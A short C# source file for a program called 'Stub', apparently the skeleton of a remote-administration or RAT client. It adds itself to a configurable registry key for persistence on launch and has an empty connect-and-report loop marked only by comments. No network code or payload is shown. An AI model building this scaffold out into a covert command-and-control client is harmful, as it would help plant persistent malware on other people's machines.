using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub
{
    static class Program
    {
        static bool shouldRun = true;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main()
        {
            //Install if configured to do so
            ThreadPool.QueueUserWorkItem(delegate
            {
                if (Config.Should_Install)
                {
                    Install();
                }
            });

            while (shouldRun)
            {
                //Try-Connect
                //Timeout
                //Report task status
            }
        }

        /// <summary>
        /// Installs the app
        /// </summary>
        /// <returns></returns>
        static bool Install()
        {
            RegistryKey regKey = Registry.CurrentUser.CreateSubKey(Config.Install_Key, true, RegistryOptions.None);
            if (regKey != null)
            {
                regKey.SetValue(Config.Install_Name, Process.GetCurrentProcess().MainModule.FileName);
                return true;
            }
            return false;
        }

        /// <summary>
        /// Uninstalls the app
        /// </summary>
        /// <returns></returns>
        static bool Uninstall()
        {
            RegistryKey regKey = Registry.CurrentUser.CreateSubKey(Config.Install_Key, true, RegistryOptions.None);
            if (regKey != null)
            {
                regKey.DeleteValue(Config.Install_Name);
                return true;
            }
            return false;
        }

        /// <summary>
        /// Disconnects the client & shuts down the app
        /// </summary>
        /// <returns></returns>
        static bool Disconnect()
        {
            shouldRun = false;
            GC.Collect();
            Environment.Exit(0);
            return true;
        }
    }
}
